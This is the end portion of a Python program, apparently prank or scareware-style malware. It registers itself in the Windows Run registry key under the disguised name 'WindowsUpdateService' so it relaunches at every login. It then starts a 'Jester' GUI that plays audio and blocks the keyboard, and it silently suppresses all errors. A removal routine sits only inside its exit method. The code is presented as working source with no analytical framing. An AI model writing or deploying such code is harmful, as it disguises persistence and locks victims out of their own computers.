            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                try:
                    winreg.DeleteValue(key, "WindowsUpdateService")
                except:
                    pass
        except:
            pass
    
    def exit(self):
        """Exit application"""
        self.audio.stop()
        pygame.mixer.quit()
        self.keyboard_blocker.stop_blocking()
        self.root.quit()
        self.root.destroy()
        os._exit(0)
    
    def run(self):
        """Run GUI"""
        try:
            self.root.mainloop()
        except:
            pass

class InvisibleApp:
    def __init__(self):
        self.script_path = os.path.abspath(__file__)
        self.ensure_startup()
    
    def ensure_startup(self):
        """Add to startup"""
        try:
            pythonw = sys.executable
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ,
                                 f'"{pythonw}" "{self.script_path}"')
        except:
            pass
    
    def run(self):
        gui = JesterGUI()
        gui.run()

if __name__ == "__main__":
    app = InvisibleApp()
    app.run()
